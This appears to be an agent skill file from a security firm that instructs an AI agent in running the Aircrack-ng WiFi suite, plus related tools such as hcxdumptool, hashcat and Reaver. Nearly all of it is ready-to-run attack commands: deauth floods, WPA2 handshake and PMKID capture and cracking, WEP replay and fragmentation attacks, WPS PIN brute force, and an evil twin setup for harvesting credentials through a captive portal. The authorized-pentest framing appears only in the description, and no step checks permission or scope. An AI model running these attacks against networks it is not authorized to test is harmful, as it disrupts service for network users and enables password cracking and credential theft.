---
name: aircrack-ng
description: >
  Operate the Aircrack-ng WiFi security suite for wireless network assessment. Use when
  performing WEP, WPA, or WPA2 cracking, capturing 4-way handshakes, executing PMKID
  attacks, injecting deauth frames, performing ARP replay attacks, or analyzing wireless
  traffic. Covers airmon-ng (monitor mode), airodump-ng (capture/scan), aireplay-ng
  (deauth/fake auth/ARP replay), aircrack-ng (cracking), airdecap-ng, packetforge-ng,
  besside-ng, WPS attacks with reaver, hashcat integration with -m 22000, and evil twin
  concepts for authorized wireless penetration testing engagements.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/aircrack-ng/aircrack-ng
---

# aircrack-ng Agent Skill

## When to Use This Skill

Use this skill when:
- The user needs to capture a WPA2 handshake or PMKID for offline cracking
- Performing a wireless network assessment (WiFi pentesting)
- Placing a wireless adapter into monitor mode and targeting specific APs
- The user asks about deauth attacks, ARP replay, fake authentication, or WPS attacks
- Integrating aircrack-ng captures with hashcat for GPU-accelerated cracking
- The user wants to decrypt captured WiFi traffic with airdecap-ng

## What Aircrack-ng Does

Aircrack-ng is a comprehensive WiFi security auditing suite consisting of multiple tools that cover the full wireless attack lifecycle: monitor mode management (airmon-ng), passive/active capture and AP enumeration (airodump-ng), packet injection and attack execution (aireplay-ng), key cracking (aircrack-ng), traffic decryption (airdecap-ng), and automated tools (besside-ng). It operates at the raw packet level and requires a compatible wireless adapter with injection capability.

## Installation

```bash
# Kali Linux (pre-installed)
aircrack-ng --help

# Debian/Ubuntu
sudo apt update && sudo apt install aircrack-ng

# macOS (limited — no injection support on built-in adapters)
brew install aircrack-ng

# Build from source
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng && autoreconf -i && ./configure && make && sudo make install

# Verify injection support
sudo airmon-ng
sudo aireplay-ng --test wlan0
```

## Compatible Hardware

Injection-capable adapters (recommended):
- **Alfa AWUS036ACH** — AC1200, dual-band, excellent injection
- **Alfa AWUS036NH** — N150, 2.4GHz, classic pentest adapter
- **Panda PAU09** — N600, dual-band, budget option
- Check chipset: `lsusb` → look for Atheros (ath9k_htc), Ralink (rt2800usb), Realtek (rtl8812au)

```bash
# Check kernel driver
lsusb
dmesg | grep -i "wlan\|usb\|wireless"
iw dev  # List wireless interfaces
```

## Core Concepts

### Monitor Mode

Monitor mode allows the adapter to capture all 802.11 frames regardless of destination — essential for passive capture and injection. Managed mode (normal) only captures frames addressed to the adapter.

### 4-Way Handshake (WPA/WPA2)

The WPA2 handshake occurs when a client connects to an AP. It contains enough information to verify candidate passphrases offline. The handshake is initiated by sending a deauth frame to force a reconnect. The PSK is never transmitted — only derived challenge-response material.

### PMKID Attack

The PMKID (Pairwise Master Key Identifier) is transmitted in the first EAPOL frame from the AP. It can be captured without waiting for a client to connect — making it faster and more reliable than 4-way handshake capture. Formula: `PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)`

## CLI Reference — airmon-ng (Monitor Mode)

```bash
# List wireless interfaces
sudo airmon-ng

# Kill conflicting processes (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Start monitor mode (creates wlan0mon)
sudo airmon-ng start wlan0

# Start on specific channel
sudo airmon-ng start wlan0 6

# Stop monitor mode (restore managed mode)
sudo airmon-ng stop wlan0mon

# After stopping, restart NetworkManager
sudo systemctl start NetworkManager
```

## CLI Reference — airodump-ng (Capture/Scan)

```bash
# Scan all channels — discover APs and clients
sudo airodump-ng wlan0mon

# Output columns: BSSID, PWR, Beacons, #Data, #/s, CH, MB, ENC, CIPHER, AUTH, ESSID
# Client section: BSSID (AP), STATION (client), PWR, Rate, Lost, Frames, Notes, Probes

# Lock to specific AP and channel, capture to file
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Creates: capture-01.cap, capture-01.csv, capture-01.kismet.csv, capture-01.kismet.netxml

# Capture on 5GHz band
sudo airodump-ng --band a wlan0mon

# Capture on both bands (2.4 + 5GHz)
sudo airodump-ng --band abg wlan0mon

# Filter by ESSID
sudo airodump-ng --essid "TargetNetwork" wlan0mon

# Write interval (default: 5s)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --write-interval 1 wlan0mon

# Capture from specific channel set
sudo airodump-ng --channel 1,6,11 wlan0mon

# Capture in IVS format (WEP only — smaller file)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture --output-format ivs wlan0mon
```

## CLI Reference — aireplay-ng (Injection / Attacks)

```bash
# Test injection capability (attack 9)
sudo aireplay-ng --test wlan0mon
sudo aireplay-ng -9 -e "TargetSSID" -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauthentication attack (attack 0) — force client reconnect to capture handshake
# Send 5 deauth frames to specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# Broadcast deauth (all clients) — use sparingly, very noisy
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# Continuous deauth
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Fake authentication (attack 1) — associate attacker with WEP AP
sudo aireplay-ng -1 0 -e "TargetSSID" -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
# Reassociate every 30s
sudo aireplay-ng -1 30 -e "TargetSSID" -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# ARP Request Replay (attack 3) — generate IVs for WEP cracking
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Interactive packet replay (attack 2)
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b AA:BB:CC:DD:EE:FF wlan0mon

# Chopchop attack (attack 4) — WEP keystream recovery
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Fragmentation attack (attack 5) — WEP PRGA recovery
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Caffe Latte attack (attack 6) — client-based WEP cracking
sudo aireplay-ng -6 -D -b AA:BB:CC:DD:EE:FF wlan0mon

# Injection attack (attack 7)
sudo aireplay-ng -7 -D -b AA:BB:CC:DD:EE:FF wlan0mon
```

## CLI Reference — aircrack-ng (Cracking)

```bash
# WEP cracking from capture file
sudo aircrack-ng capture-01.cap
# or with BSSID filter
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap

# WPA/WPA2 dictionary attack
sudo aircrack-ng -w /opt/seclists/Passwords/Leaked-Databases/rockyou.txt \
                 -b AA:BB:CC:DD:EE:FF capture-01.cap

# WPA with multiple wordlists
sudo aircrack-ng -w /opt/seclists/Passwords/Leaked-Databases/rockyou.txt,/tmp/custom.txt \
                 capture-01.cap

# WPA with ESSID hint (useful if not in capture)
sudo aircrack-ng -e "TargetNetwork" \
                 -w rockyou.txt capture-01.cap

# CPU threads
sudo aircrack-ng -w rockyou.txt -p 8 capture-01.cap

# WEP with PTW attack (fast — needs only ~20k IVs)
sudo aircrack-ng -z capture-01.cap
```

## Common Workflows

### WPA2 Handshake Capture → Crack

```bash
# Step 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Identify target
sudo airodump-ng wlan0mon
# Note: BSSID (AA:BB:CC:DD:EE:FF), CH (6), ESSID (TargetNetwork), clients

# Step 3: Lock to target AP and capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/handshake wlan0mon &

# Step 4: Deauth client to force handshake
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# Watch airodump-ng for "WPA handshake: AA:BB:CC:DD:EE:FF" in top-right

# Step 5: Verify handshake
aircrack-ng /tmp/handshake-01.cap  # Should show "1 handshake" without cracking

# Step 6: Crack offline
aircrack-ng -w /opt/seclists/Passwords/Leaked-Databases/rockyou.txt \
            -b AA:BB:CC:DD:EE:FF /tmp/handshake-01.cap
```

### PMKID Attack (No Client Needed)

```bash
# Install hcxtools
sudo apt install hcxtools hcxdumptool

# Step 1: Enable monitor mode
sudo airmon-ng check kill && sudo airmon-ng start wlan0

# Step 2: Capture PMKID
sudo hcxdumptool -i wlan0mon \
  --filterlist_ap=targets.txt --filtermode=2 \
  -o pmkid_capture.pcapng \
  --enable_status=1
# targets.txt: one BSSID per line (no colons)
# Wait ~60 seconds for PMKID

# Step 3: Convert to hashcat format
hcxpcapngtool -o hashes.22000 pmkid_capture.pcapng
# or older format:
hcxpcapngtool --hccapx=hashes.hccapx pmkid_capture.pcapng  # -m 2500 (deprecated)

# Step 4: Crack with hashcat (PMKID + Handshake unified format)
hashcat -m 22000 hashes.22000 /opt/seclists/Passwords/Leaked-Databases/rockyou.txt
hashcat -m 22000 hashes.22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### WEP Cracking (Legacy Environments)

```bash
# Step 1: Monitor mode and capture
sudo airmon-ng start wlan0 6
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_cap --output-format ivs wlan0mon &

# Step 2: Fake auth
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Step 3: ARP replay to generate IVs
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
# Wait for ~50,000+ IVs for 64-bit WEP, ~100,000+ for 128-bit

# Step 4: Crack
sudo aircrack-ng wep_cap-01.ivs
```

### WPS Attack with Reaver

```bash
# Install reaver
sudo apt install reaver wash

# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Reaver WPS PIN brute force (can take hours)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie Dust attack (fast — offline, works on vulnerable APs)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# With channel locked
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
```

### Hashcat Integration

```bash
# Convert handshake to hashcat format
# Method 1: hcxtools (preferred)
hcxpcapngtool -o capture.22000 /tmp/handshake-01.cap

# Method 2: cap2hccapx (legacy, -m 2500)
cap2hccapx /tmp/handshake-01.cap capture.hccapx

# GPU crack WPA2 (-m 22000)
hashcat -m 22000 capture.22000 rockyou.txt
hashcat -m 22000 capture.22000 rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
hashcat -m 22000 capture.22000 -a 3 ?d?d?d?d?d?d?d?d  # 8-digit PIN mask

# Legacy -m 2500 (hccapx)
hashcat -m 2500 capture.hccapx rockyou.txt
```

## Advanced Techniques

### airdecap-ng — Decrypt Captured Traffic

```bash
# Decrypt WEP capture
airdecap-ng -w AABBCCDDEEFF capture-01.cap

# Decrypt WPA capture (need PSK)
airdecap-ng -p "MyWiFiPass" -e "NetworkName" capture-01.cap

# Output: capture-01-dec.cap (decrypted frames, no 802.11 headers)
# Open in Wireshark for plaintext inspection
```

### packetforge-ng — Custom Packet Injection

```bash
# Create ARP request for WEP ARP replay
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 \
               -k 255.255.255.255 -l 255.255.255.255 \
               -y keystream.xor -w arp_packet.cap

# Inject crafted packet
aireplay-ng -2 -r arp_packet.cap wlan0mon
```

### besside-ng — Automated WEP/WPA Cracking

```bash
# Automated attack against all WEP APs in range
sudo besside-ng wlan0mon

# Target specific AP
sudo besside-ng -b AA:BB:CC:DD:EE:FF wlan0mon

# Output: wpa.cap (handshakes), wep.cap (IVs)
```

### Evil Twin Concept

```bash
# 1. Identify target AP (ESSID, BSSID, channel, encryption)
# 2. Create rogue AP with same ESSID on different channel
sudo hostapd-mana rogue_ap.conf  # or airbase-ng
# 3. Deauth clients from legitimate AP
sudo aireplay-ng -0 0 -a REAL_BSSID wlan0mon
# 4. Clients connect to rogue AP
# 5. Serve captive portal for credential harvest OR perform MITM
# Note: use hostapd-wpe for WPA2-Enterprise evil twin (captures EAP creds)
```

## Troubleshooting

**Monitor mode fails:**
```bash
# Check for conflicting processes
sudo airmon-ng check
sudo airmon-ng check kill
sudo rfkill unblock all
```

**Injection test fails (0%):**
- Adapter does not support injection (check chipset)
- Use external USB adapter — internal adapters rarely support injection
- `aireplay-ng --test wlan0mon` must show packets sent/received

**No handshake captured:**
- Wait longer — airodump-ng must show active client first
- Increase deauth count: `-0 10` or continuous `-0 0`
- Try multiple deauth bursts at intervals
- Some clients use Management Frame Protection (MFP/802.11w) — deauth won't work

**Handshake captured but aircrack-ng says "0 handshakes":**
```bash
# Verify with pyrit
pyrit -r capture-01.cap analyze
# or
cowpatty -r capture-01.cap -c   # Check capture validity
```

**Reaver stalls or disconnects:**
```bash
# Use --no-associate (let airodump handle association)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv --no-associate
# Reduce rate
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 3 -r 3:15
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
